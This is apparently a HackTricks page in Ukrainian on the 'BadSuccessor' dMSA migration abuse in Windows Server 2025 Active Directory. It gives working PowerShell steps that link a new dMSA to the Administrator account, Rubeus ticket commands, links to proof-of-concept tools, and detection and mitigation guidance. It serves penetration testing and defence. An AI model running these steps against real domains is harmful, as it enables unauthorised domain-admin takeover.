# BadSuccessor: Підвищення привілеїв через зловживання міграцією делегованих MSA

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Делеговані керовані облікові записи служб (**dMSA**) є наступним поколінням наступників **gMSA**, які постачаються в Windows Server 2025. Легітимний робочий процес міграції дозволяє адміністраторам замінити *старий* обліковий запис (користувача, комп'ютера або службовий обліковий запис) на dMSA, при цьому прозоро зберігаючи дозволи. Робочий процес реалізується через PowerShell cmdlets, такі як `Start-ADServiceAccountMigration` та `Complete-ADServiceAccountMigration`, і спирається на два атрибути LDAP об'єкта **dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN посилання* на попередній (старий) обліковий запис.
* **`msDS-DelegatedMSAState`**       – стан міграції (`0` = немає, `1` = в процесі, `2` = *завершено*).

Якщо зловмисник може створити **будь-який** dMSA всередині OU і безпосередньо маніпулювати цими 2 атрибутами, LSASS та KDC будуть розглядати dMSA як *наступника* пов'язаного облікового запису. Коли зловмисник потім аутентифікується як dMSA, **він успадковує всі привілеї пов'язаного облікового запису** – до **Domain Admin**, якщо обліковий запис адміністратора пов'язаний.

Цю техніку було названо **BadSuccessor** командою Unit 42 у 2025 році. На момент написання **жоден патч безпеки** не доступний; лише зміцнення дозволів OU пом'якшує цю проблему.

### Передумови атаки

1. Обліковий запис, якому *дозволено* створювати об'єкти всередині **Організаційної одиниці (OU)** *та* має принаймні один з:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** клас об'єкта
* `Create Child` → **`All Objects`** (загальне створення)
2. Мережева підключеність до LDAP та Kerberos (стандартний сценарій приєднання до домену / віддалена атака).

## Перерахування вразливих OU

Unit 42 випустила допоміжний скрипт PowerShell, який аналізує дескриптори безпеки кожної OU та підкреслює необхідні ACEs:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Під капотом скрипт виконує пагінований LDAP пошук для `(objectClass=organizationalUnit)` і перевіряє кожен `nTSecurityDescriptor` на

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (об'єкт класу *msDS-DelegatedManagedServiceAccount*)

## Кроки експлуатації

Як тільки знайдено записуваний OU, атака складається лише з 3 LDAP записів:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Після реплікації зловмисник може просто **увійти** як `attacker_dMSA$` або запитати Kerberos TGT – Windows створить токен *попереднього* облікового запису.

### Автоматизація

Кілька публічних PoC обгортають весь робочий процес, включаючи отримання пароля та управління квитками:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* Модуль NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Пост-експлуатація
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Виявлення та полювання

Увімкніть **Аудит об'єктів** на OUs та моніторте наступні події безпеки Windows:

* **5137** – Створення об'єкта **dMSA**
* **5136** – Модифікація **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Зміни конкретних атрибутів
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Видача TGT для dMSA

Кореляція `4662` (модифікація атрибутів), `4741` (створення облікового запису комп'ютера/сервісу) та `4624` (наступний вхід) швидко підкреслює активність BadSuccessor. Рішення XDR, такі як **XSIAM**, постачаються з готовими запитами (див. посилання).

## Пом'якшення

* Застосуйте принцип **найменших привілеїв** – делегуйте управління *обліковими записами сервісів* лише довіреним ролям.
* Видаліть `Create Child` / `msDS-DelegatedManagedServiceAccount` з OUs, які не потребують цього явно.
* Моніторте події з вказаними вище ідентифікаторами та сповіщайте про *не-Tier-0* особи, які створюють або редагують dMSA.

## Дивіться також

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Посилання

- [Unit42 – Коли хороші облікові записи стають поганими: експлуатація делегованих облікових записів сервісів](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Колекція інструментів для тестування на проникнення](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [Модуль BadSuccessor NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
